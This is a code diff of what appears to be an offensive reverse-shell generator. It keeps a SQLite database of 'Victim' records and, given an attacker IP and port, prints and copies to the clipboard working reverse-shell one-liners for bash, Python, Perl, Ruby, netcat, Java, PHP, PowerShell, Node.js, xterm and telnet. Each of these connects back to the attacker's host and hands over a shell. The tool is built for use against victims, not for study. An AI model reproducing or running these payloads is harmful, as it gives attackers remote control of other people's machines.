@@ -1,20 +1,21 @@
 import os
 import time
 import socket
+import pyperclip
 import subprocess
+import tkinter as tk
 from flask import Flask
 from flask_sqlalchemy import SQLAlchemy
 
+
+Clipboard = pyperclip
+
 # Initialize Flask app (not necessary for database operations)
 app = Flask(__name__)
-
-# Configure database URI
 app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///llehs.db'
 
 # Suppress deprecation warnings
 app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
-
-# Initialize SQLAlchemy object
 db = SQLAlchemy(app)
 
 # Define the Victim model
@@ -56,13 +57,13 @@ def generate():
     
     while True:
         print("Choose category of script:")
-        print("[1] - Our HoemBrew Script - recommended")
+        print("[1] - Our HoemBrew Scripts - recommended")
         print("[2] - Linux Basic Scripts")
         print("[3] - Personalized Script")
         userInput = input(": ")
 
         if userInput == "1":
-            homeBrewScript(ip, port) # call homeBrewScript that we will make
+            homeBrewScript(ip, port) # call homeBrewScripts that we will make
             break
 
         elif userInput == "2":
@@ -82,44 +83,138 @@ def generate():
             userInput = input(": ")
 
             if userInput == "1" or userInput.lower() == "bash":
-                print("bash -i >& /dev/tcp/" + ip + "/" + port + " 0>&1")
+                currentScript = "bash -i >& /dev/tcp/" + ip + "/" + port + " 0>&1"
+                print("\n" + currentScript + "\n" )
+
+                pyperclip.copy(currentScript) # copies the script to the clipboard
+
+                print("Script copied to clipboard!")
+                print("Message: Make sure to have a listener running on the specified port.")
                 break
+            
             elif userInput == "2" or userInput.lower() == "python":
-                print("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"" + ip + "\"," + port + "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'")
+                currentScript = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"" + ip + "\"," + port + "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' \n"
+                print("\n" + currentScript + "\n" )
+
+                pyperclip.copy(currentScript)
+
+                print("Script copied to clipboard!")
+                print("Message: Make sure to have a listener running on the specified port.")
                 break
+
             elif userInput == "3" or userInput.lower() == "perl":
-                print("perl -e 'use Socket;$i=\"" + ip + "\";$p=" + port + ";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'")
+                currentScript = "perl -e 'use Socket;$i=\"" + ip + "\";$p=" + port + ";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};' \n"
+                print("\n" + currentScript + "\n" )
+
+                pyperclip.copy(currentScript)
+
+                print("Script copied to clipboard!")
+                print("Message: Make sure to have a listener running on the specified port.")
                 break
+
             elif userInput == "4" or userInput.lower() == "ruby":
-                print("ruby -rsocket -e'f=TCPSocket.open(\"" + ip + "\"," + port + ").to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'")
+                currentScript = "ruby -rsocket -e'f=TCPSocket.open(\"" + ip + "\"," + port + ").to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)' \n"
+                print("\n" + currentScript + "\n" )
+
+                pyperclip.copy(currentScript)
+
+                print("Script copied to clipboard!")
+                print("Message: Make sure to have a listener running on the specified port.")
                 break
+
             elif userInput == "5" or userInput.lower() == "netcat":
-                print("nc -e /bin/sh " + ip + " " + port)
+                currentScript = "nc -e /bin/sh " + ip + " " + port + "\n"
+                print("\n" + currentScript + "\n" )
+
+                pyperclip.copy(currentScript)
+
+                print("Script copied to clipboard!")
+                print("Message: Make sure to have a listener running on the specified port.")
                 break
+
             elif userInput == "6" or userInput.lower() == "java":
-                print("r = Runtime.getRuntime();p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/" + ip + "/" + port + ";cat <&5 | while read line; do $line 2>&5 >&5; done\"] as String[]);p.waitFor()")
+                currentScript = "r = Runtime.getRuntime();p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/" + ip + "/" + port + ";cat <&5 | while read line; do $line 2>&5 >&5; done\"] as String[]);p.waitFor() \n"
+                print("\n" + currentScript + "\n" )
+
+                pyperclip.copy(currentScript)
+
+                print("Script copied to clipboard!")
+                print("Message: Make sure to have a listener running on the specified port.")
                 break
+
             elif userInput == "7" or userInput.lower() == "php":
-                print("php -r '$sock=fsockopen(\"" + ip + "\"," + port + ");exec(\"/bin/sh -i <&3 >&3 2>&3\");'")
+                currentScript = "php -r '$sock=fsockopen(\"" + ip + "\"," + port + ");exec(\"/bin/sh -i <&3 >&3 2>&3\");' \n"
+                print("\n" + currentScript + "\n" )
+
+                pyperclip.copy(currentScript)
+
+                print("Script copied to clipboard!")
+                print("Message: Make sure to have a listener running on the specified port.")
                 break
+
             elif userInput == "8" or userInput.lower() == "powershell":
-                print("powershell -c \"$client = New-Object System.Net.Sockets.TCPClient('" + ip + "'," + port + ");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"")
+                currentScript = "powershell -c \"$client = New-Object System.Net.Sockets.TCPClient('" + ip + "'," + port + ");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\" \n"
+                print("\n" + currentScript + "\n" )
+
+                pyperclip.copy(currentScript)
+
+                print("Script copied to clipboard!")
+                print("Message: Make sure to have a listener running on the specified port.")
                 break
+
             elif userInput == "9" or userInput.lower() == "node.js":
-                print("node -e 'var net = require(\"net\"), sh = require(\"child_process\").exec(\"/bin/sh\"), client = new net.Socket();client.connect(" + port + ", \"" + ip + "\", function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});'")
+                currentScript = "node -e 'var net = require(\"net\"), sh = require(\"child_process\").exec(\"/bin/sh\"), client = new net.Socket();client.connect(" + port + ", \"" + ip + "\", function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});' \n"
+                print("\n" + currentScript + "\n" )
+
+                pyperclip.copy(currentScript)
+
+                print("Script copied to clipboard!")
+                print("Message: Make sure to have a listener running on the specified port.")
                 break
+
             elif userInput == "10" or userInput.lower() == "xterm":
-                print("xterm -display " + ip + ":" + port)
+                currentScript = "xterm -display " + ip + ":" + port + "\n"
+                print("\n" + currentScript + "\n" )
+
+                pyperclip.copy(currentScript)
+
+                print("Script copied to clipboard!")
+                print("Message: Make sure to have a listener running on the specified port.")
                 break
+
             elif userInput == "11" or userInput.lower() == "telnet":
-                print("telnet " + ip + " " + port + " | /bin/bash | telnet " + ip + " " + port)
+                currentScript = "telnet " + ip + " " + port + " | /bin/bash | telnet " + ip + " " + port + "\n"
+                print("\n" + currentScript + "\n" )
+
+                pyperclip.copy(currentScript)
+
+                print("Script copied to clipboard!")
+                print("Message: Make sure to have a listener running on the specified port.")
                 break
+
             else:
                 print("Invalid choice")
                 continue
 
-        elif userInput == "3":
-            print("work in progress") # prompt user for their own script | maybe a file upload pop-up
+        elif userInput == "3": # Could not be possible, still working on it
+            print("Please chose one of the following:")
+            print("[1] - Upload a script")
+            print("[2] - Write a script")
+
+            userInput = input(": ")
+
+            if userInput == "1":
+                print("work in progress")
+                break
+
+            elif userInput == "2":
+                print("work in progress")
+                break
+            
+            else:
+                print("Invalid choice")
+                continue
+
             break
 
         else:
